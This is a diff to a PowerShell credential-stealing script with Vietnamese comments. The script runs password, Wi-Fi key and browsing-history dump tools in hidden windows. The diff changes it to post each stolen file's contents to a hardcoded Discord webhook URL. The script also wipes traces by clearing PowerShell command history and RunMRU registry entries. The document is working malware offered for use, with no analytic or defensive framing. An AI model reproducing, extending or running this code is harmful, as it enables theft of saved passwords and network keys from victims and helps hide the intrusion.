@@ -28,93 +28,47 @@ Start-Process -FilePath ".\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFil
 Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden
 Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden
 
-# Wait for the files to be fully written
-while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
-    Start-Sleep -Milliseconds 100
-}
-
-Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
-
-# ============================================
-# NÉN DỮ LIỆU (ĐÃ SỬA LỖI)
-# ============================================
-
-# Đợi file được ghi hoàn tất
-Start-Sleep -Seconds 2
-
-# Kiểm tra thư mục dump có file không
-$fileCount = (Get-ChildItem "$dumpFolder" -File -ErrorAction SilentlyContinue).Count
-Write-Output "Số file trong thư mục dump: $fileCount"
-
-if ($fileCount -eq 0) {
-    Write-Output "Không có file nào để nén! Thoát."
-    exit 1
-}
-
-# Xóa file zip cũ nếu tồn tại
-if (Test-Path "$dumpFile") {
-    Remove-Item "$dumpFile" -Force
-}
-
-# Nén bằng .NET (ổn định hơn Compress-Archive)
-try {
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    $zip = [System.IO.Compression.ZipFile]::Open("$dumpFile", 'Create')
-    Get-ChildItem -Path "$dumpFolder" -Recurse | ForEach-Object {
-        $relativePath = $_.FullName.Substring($dumpFolder.Length + 1)
-        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $relativePath)
+# Wait for files (60 seconds max)
+$maxWait = 60
+$waited = 0
+while ($waited -lt $maxWait) {
+    if ((Test-Path "passwords.txt") -or (Test-Path "wifi.txt") -or (Test-Path "connected_devices.txt") -or (Test-Path "history.txt")) {
+        break
     }
-    $zip.Dispose()
-    Write-Output "Đã nén thành công: $dumpFile"
-} catch {
-    Write-Output "Lỗi nén: $_"
-    exit 1
+    Start-Sleep -Seconds 1
+    $waited++
 }
 
-# Kiểm tra file zip có được tạo không
-if ((Test-Path "$dumpFile") -and ((Get-Item "$dumpFile").Length -gt 0)) {
-    Write-Output "File zip đã được tạo, kích thước: $((Get-Item "$dumpFile").Length) bytes"
-} else {
-    Write-Output "File zip không được tạo hoặc bị rỗng!"
-    exit 1
-}
+# Discord webhook
+$hookurl = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
 
-# ============================================
-# DISCORD WEBHOOK CONFIG
-# ============================================
-
-$dc = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
-$hookurl = "$dc"
-if ($hookurl.Length -lt 120){
-    $hookurl = ("https://discord.com/api/webhooks/" + "$dc")
-}
-
-# ============================================
-# GỬI FILE ZIP QUA DISCORD
-# ============================================
-
-if (Test-Path "$dumpFile") {
-    $fileBytes = [System.IO.File]::ReadAllBytes("$dumpFile")
-    $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
+# Send each text file directly (no zip, no move)
+function Send-FileToDiscord {
+    param([string]$FilePath)
+    if (!(Test-Path $FilePath)) { return }
     
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $multipartContent = @"
---$boundary
-Content-Disposition: form-data; name="file1"; filename="$([System.IO.Path]::GetFileName("$dumpFile"))"
-Content-Type: application/zip
-
-$fileBase64
---$boundary--
-"@
-    $headers = @{"Content-Type" = "multipart/form-data; boundary=$boundary"}
+    $fileContent = Get-Content $FilePath -Raw
+    $fileName = [System.IO.Path]::GetFileName($FilePath)
+    
+    if ($fileContent.Length -gt 1900) {
+        $fileContent = $fileContent.Substring(0, 1900) + "`n... [File too long]"
+    }
+    
+    $payload = @{ content = "**📁 $fileName**`n```$fileContent```" } | ConvertTo-Json
     
     try {
-        Invoke-RestMethod -Uri $hookurl -Method Post -Body $multipartContent -Headers $headers -UseBasicParsing
-        Write-Output "Đã gửi file zip qua Discord thành công!"
+        Invoke-RestMethod -Uri $hookurl -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing
+        Write-Output "✅ Sent: $fileName"
     } catch {
-        Write-Output "Lỗi gửi file zip: $_"
+        Write-Output "❌ Failed: $fileName"
     }
 }
+
+# Send files directly from current folder
+Send-FileToDiscord -FilePath ".\passwords.txt"
+Send-FileToDiscord -FilePath ".\wifi.txt"
+Send-FileToDiscord -FilePath ".\connected_devices.txt"
+Send-FileToDiscord -FilePath ".\history.txt"
 
 # ============================================
 # ẨN CỬA SỔ (CHO FINDSEND)
@@ -195,8 +149,8 @@ FindAndSend
 # DỌN DẸP DẤU VẾT
 # ============================================
 
+# Cleanup
 Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-
 try {
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
     Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
